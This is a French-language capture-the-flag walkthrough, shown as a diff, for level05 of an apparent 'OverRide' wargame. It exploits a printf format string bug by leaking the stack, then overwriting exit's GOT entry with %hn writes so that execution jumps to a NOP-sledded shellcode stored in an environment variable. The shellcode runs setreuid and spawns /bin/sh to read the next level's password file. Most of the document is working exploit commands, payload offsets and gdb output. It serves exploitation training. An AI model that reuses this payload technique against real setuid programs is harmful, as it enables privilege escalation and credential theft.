@@ -1,0 +1,131 @@
+- Apres analyse du code asm, on remarque que le buffer
+de fgets avec imprimer avec printf sans format string
+ce qui va nous permettre d'imprimer la stack
+- On va modifier l'adresse qui pointe sur la fonction
+exit afin d'executer un shellcode au moment de son appel
+
+1) On imprime la stack
+
+touch /tmp/test
+chmod 777 /tmp/test
+nano /tmp/test
+
+python -c 'print "AAAABBBB" + "%p." * 20'
+
+./level05 < <(/tmp/test)
+
+aaaabbbb0x64.0xf7fcfac0.0xf7ec3af9.0xffffd6df.0xffffd6de.(nil).0xffffffff.0xffffd764.0xf7fdb000.0x61616161.0x62626262.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.
+
+On voit que AAAA et BBB sont les arguments 10 et 11
+
+2) On recherche l'adresse d'exit
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+080497e0 R_386_JUMP_SLOT   exit
+
+3) L'exploit sera de la forme :
+
+python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%p" * 11 + "%???x%10$hn%???x%11$hn"'
+
+4) Le shellcode sera le suivant :
+
+export TOTO=`python -c 'print "\x90" * 100 + "\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\xeb\x21\x5f\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe6\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x57\x56\x53\x89\xe1\xcd\x80\xe8\xda\xff\xff\xffcat /home/users/level06/.pass; whoami; exit"'`
+
+5) On va rechercher l'adresse de TOTO sous gdb
+
+gdb ./level06
+
+break main
+r
+x/1024xg $esp
+
+0xffffde30:     0x73726573752f656d      0x35306c6576656c2f
+0xffffde40:     0x6e653d474e414c00      0x2d4654552e53555f
+0xffffde50:     0x903d4f544f540038      0x9090909090909090
+0xffffde60:     0x9090909090909090      0x9090909090909090
+0xffffde70:     0x9090909090909090      0x9090909090909090
+---Type <return> to continue, or q <return> to quit---
+0xffffde80:     0x9090909090909090      0x9090909090909090
+0xffffde90:     0x9090909090909090      0x9090909090909090
+0xffffdea0:     0x9090909090909090      0x9090909090909090
+0xffffdeb0:     0x9090909090909090      0xdb3158466a909090
+0xffffdec0:     0x6a5f21eb80cdc931      0x632d68665299580b
+0xffffded0:     0x68732f2f6852e689      0x52e3896e69622f68
+0xffffdee0:     0xe880cde189535657      0x20746163ffffffda
+
+==> On va pointer vers 0xffffdea0
+
+6) On va cherche les coeff pour le payload
+
+0xdea0 - 19 = 0xde87 = 56967
+
+0xffff - 0xdea0 = 0x215f = 8543
+
+gdb ./level06
+break main
+break *0x804850c
+r < <(/tmp/test1)
+c
+x/32xg 0x080497e0
+
+0x80497e0 <exit@got.plt>:       0xf7e45420004adeeb      0x0000000000000000
+0x80497f0 <stdin@@GLIBC_2.0>:   0x00000000f7fcfac0      0x0000000000000000
+
+6) On corrige le 1er coeff
+
+0xdeeb - 0xdea0 = 0x4b = 75
+
+===> 56892
+===> 8543
+
+0x80497e0 <exit@got.plt>:       0xf7e45420ffffdea0      0x0000000000000000
+0x80497f0 <stdin@@GLIBC_2.0>:   0x00000000f7fcfac0      0x0000000000000000
+
+7) Marche sous strace ou gdb mais pas sans
+
+On va chercher l'adresse de TOTO dans les meme condition que gdb
+
+nano /tmp/gettoto.c
+
+int     main(void)
+{
+        printf("TOTO : %p\n", getenv("TOTO"));
+}
+
+cd /tmp
+gcc -m32 gettoto.c
+mv /tmp/a.out /tmp/level9aaaaaaaaaaaaaaaa
+
+On modifie le shellcode avec un plus grand nombre de nop
+
+export TOTO=`python -c 'print "\x90" * 10000 + "\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\xeb\x21\x5f\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe6\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x57\x56\x53\x89\xe1\xcd\x80\xe8\xda\xff\xff\xffcat /home/users/level06/.pass; whoami; exit"
+
+level05@OverRide:~$ /tmp/level9aaaaaaaaaaaaaaaa
+TOTO : 0xffffde42
+
+On va viser 0xffff1111 :
+
+0x1111 - 100 (la length de la taille de la string impriméé avec printf) = 4269
+
+0xffff - 0x1111 = 61166
+
+===> Marche tjrs pas hors gdb
+
+On remarque une diff entre le string impriméé avec une copie du prog donc non suid et celle avec suid
+
+Suid :    ▒0x640xf7fcfac00xf7ec3af90xfffe4fbf0xfffe4fbe(nil)0xffffffff0xfffe50440xf7fdb0000x80497e00x80497e2
+
+No suid : ▒0x640xf7fcfac00xf7ec3af90xfffe4fbf0xfffe4fbe(nil)0xffffffff0xfffe5044(nil)0x80497e00x80497e2 
+
+On va soustraitre la différence des char imprimé sur le 1er %n ==> 5
+
+- Exploit :
+
+nano /tmp/test5
+
+python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%p" * 11 + "%4264x%10$hn%61166x%11$hn"'
+
+chmod 777 /tmp/test5
+export TOTO=`python -c 'print "\x90" * 100000 + "\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\xeb\x21\x5f\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe6\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x57\x56\x53\x89\xe1\xcd\x80\xe8\xda\xff\xff\xffcat /home/users/level06/.pass; whoami; exit"'`
+/home/users/level05/level05 < <(/tmp/test5)
